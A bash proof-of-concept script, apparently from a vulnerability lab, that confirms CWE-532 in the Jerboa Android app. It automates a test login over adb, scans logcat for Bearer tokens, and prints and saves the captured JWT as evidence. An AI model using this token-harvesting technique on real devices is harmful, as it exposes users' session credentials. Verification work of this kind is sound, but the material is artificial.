#!/bin/bash
# Verification script for CWE-532: Automates login and verifies JWT token exposure

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="$SCRIPT_DIR/captured_credentials.txt"
LOGCAT_FILE="$SCRIPT_DIR/logcat_output.txt"
TEST_INSTANCE="lemmy.ml"
TEST_USERNAME="${TEST_USERNAME:-test}"
TEST_PASSWORD="${TEST_PASSWORD:-test123}"
TIMEOUT=30

echo "CWE-532 Verification"
echo ""

# Check prerequisites
if ! adb devices | grep -q "device$"; then
    echo "Error: No device connected"
    exit 1
fi

if ! adb shell pm list packages | grep -q "com.jerboa"; then
    echo "Error: Jerboa not installed. Run ./setup_vuln.sh first."
    exit 1
fi

echo "✓ Device connected"
echo "✓ App installed"
echo ""

# Clean up
rm -f "$LOG_FILE" "$LOGCAT_FILE"

# Use test server by default
echo "Using test server with ngrok tunnel..."
choice=1

if [ "$choice" = "1" ]; then
    if ! python3 -c "import pyngrok" 2>/dev/null; then
        echo "Installing pyngrok..."
        pip3 install pyngrok -q || { echo "Error: pyngrok install failed"; exit 1; }
    fi

    echo "Starting test server..."
    python3 "$SCRIPT_DIR/lemmy_server.py" --port 8000 --tunnel > /tmp/lemmy_server.log 2>&1 &
    SERVER_PID=$!
    sleep 5

    SERVER_URL=$(grep -o 'https://[^[:space:]]*\.ngrok[^[:space:]]*' /tmp/lemmy_server.log 2>/dev/null | head -1 | tr -d "'\"")
    SERVER_URL=${SERVER_URL:-http://10.0.2.2:8000}

    cleanup_server() { kill $SERVER_PID 2>/dev/null || true; }
    trap cleanup_server EXIT

    echo "Server: $SERVER_URL"
    echo "Using instance URL for login: $SERVER_URL"
else
    SERVER_URL="https://$TEST_INSTANCE"
    echo "Instance: $SERVER_URL"
fi

echo ""

# Start monitoring
echo "Starting logcat monitoring..."
adb logcat -c
adb logcat "*:E" "LemmyAPI:D" > "$LOGCAT_FILE" 2>&1 &
LOGCAT_PID=$!
cleanup() { kill $LOGCAT_PID 2>/dev/null || true; }
trap cleanup EXIT

# Run automated login with improved dialog handling
echo "Running automated login..."
python3 "$SCRIPT_DIR/login_automation.py" "$SERVER_URL" "$TEST_USERNAME" "$TEST_PASSWORD"
LOGIN_RESULT=$?

if [ $LOGIN_RESULT -ne 0 ]; then
    echo ""
    echo "=== AUTOMATION FAILED - MANUAL LOGIN ==="
    echo "Please complete the login manually:"
    echo "  Instance: $SERVER_URL"
    echo "  Username: $TEST_USERNAME"
    echo "  Password: $TEST_PASSWORD"
    echo ""
    echo "Note: Dismiss any stylus/handwriting dialogs if they appear"
    echo ""
    adb shell am start -n com.jerboa.debug/com.jerboa.MainActivity >/dev/null 2>&1
    sleep 2
    read -p "Press Enter after you click the Login button..."
else
    echo ""
    echo "Login automation completed, waiting for authentication..."
    sleep 3
fi

# Monitor for tokens
echo ""
echo "Monitoring for tokens (${TIMEOUT}s timeout)..."

FOUND=false
START_TIME=$(date +%s)

while [ $(($(date +%s) - START_TIME)) -lt $TIMEOUT ]; do
    if grep -q "Authorization: Bearer" "$LOGCAT_FILE" 2>/dev/null; then
        FOUND=true
        break
    fi
    sleep 1
    echo -n "."
done

echo ""
echo ""

# Results
if [ "$FOUND" = true ]; then
    TOKEN=$(grep -o 'Authorization: Bearer [^ ]*' "$LOGCAT_FILE" | head -1 | awk '{print $3}')
    grep "Authorization: Bearer" "$LOGCAT_FILE" > "$LOG_FILE"

    echo "Vulnerability confirmed. JWT Token: $TOKEN"
    echo ""
    echo "Evidence: $LOG_FILE"
    echo "Full logs: $LOGCAT_FILE"
    echo ""
    echo "Result: Exploit succeeded (vulnerability present)"
    echo ""
    exit 0
else
    echo "No JWT tokens found in logcat."
    echo "Logs: $LOGCAT_FILE"
    echo ""
    echo "Result: Exploit failed (no vulnerability)"
    echo ""
    exit 1
fi
